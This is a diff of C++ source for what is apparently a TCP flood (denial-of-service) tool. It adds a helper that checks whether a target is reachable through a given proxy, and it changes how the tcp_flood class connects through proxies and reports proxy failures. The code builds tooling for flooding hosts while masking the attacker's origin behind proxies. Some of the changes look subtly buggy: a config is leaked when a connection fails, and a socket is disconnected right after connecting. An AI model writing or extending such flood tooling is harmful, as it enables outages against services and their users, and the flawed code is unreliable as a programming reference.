@@ -25,7 +25,6 @@ pthread_mutex_t mutex = PTHREAD_MUTEX_INITIALIZER;
 
 namespace net
 {
-	
 	namespace __detail__ __attribute__((visibility("hidden")))
 	{
 		inline static consteval size_t consteval_strlen(const char* str)
@@ -206,6 +205,29 @@ namespace net
 		r_read_failed
 	};
 	
+	inline static bool is_address_available_through_proxy(
+			const inet_address& address, const inet_address& proxy, int proxytype = PROXYSOCKET_TYPE_NONE,
+			const char* proxy_user = "", const char* proxy_password = "",
+			bool debug = false)
+	{
+		proxysocketconfig proxysock_cfg;
+		proxysock_cfg = proxysocketconfig_create_direct();
+		if (debug)
+			proxysocketconfig_set_logging(proxysock_cfg, __detail__::logger_fn, (int*)&debug);
+		proxysocketconfig_use_proxy_dns(proxysock_cfg, 1);
+		proxysocketconfig_add_proxy(proxysock_cfg, proxytype, proxy.get_ip().c_str(), proxy.get_port(), proxy_user, proxy_password);
+		proxysocketconfig_set_timeout(proxysock_cfg, 500, 500);
+		char* errmsg;
+		int socket;
+		if ((socket = proxysocket_connect(proxysock_cfg, address.get_ip().c_str(), address.get_port(), &errmsg)) < 0)
+		{
+			return false;
+		}
+		proxysocket_disconnect(proxysock_cfg, socket);
+		proxysocketconfig_free(proxysock_cfg);
+		return true;
+	}
+	
 	class tcp_flood
 	{
 	public:
@@ -216,9 +238,9 @@ namespace net
 				bool debug = false)
 				: address(address), socket(::socket(PF_INET, SOCK_STREAM, IPPROTO_TCP))
 		{
-			proxysocketconfig proxysock_cfg;
 			if (proxy)
 			{
+				proxysocketconfig proxysock_cfg;
 				proxysock_cfg = proxysocketconfig_create_direct();
 				if (debug)
 					proxysocketconfig_set_logging(proxysock_cfg, __detail__::logger_fn, (int*)&debug);
@@ -228,9 +250,15 @@ namespace net
 				::close(socket);
 				if ((socket = proxysocket_connect(proxysock_cfg, address.get_ip().c_str(), address.get_port(), &errmsg)) < 0)
 				{
+					::printf(
+							COLOR_YELLOW COLOR_INTENSE " [ " COLOR_BLUE "%s:%hu" COLOR_YELLOW " ] %s" COLOR_RESET "\n",
+							proxy->get_ip().c_str(), proxy->get_port(), errmsg
+					);
 					status = r_failed;
 					return;
 				}
+				proxysocket_disconnect(proxysock_cfg, socket);
+				proxysocketconfig_free(proxysock_cfg);
 			}
 			else
 			{
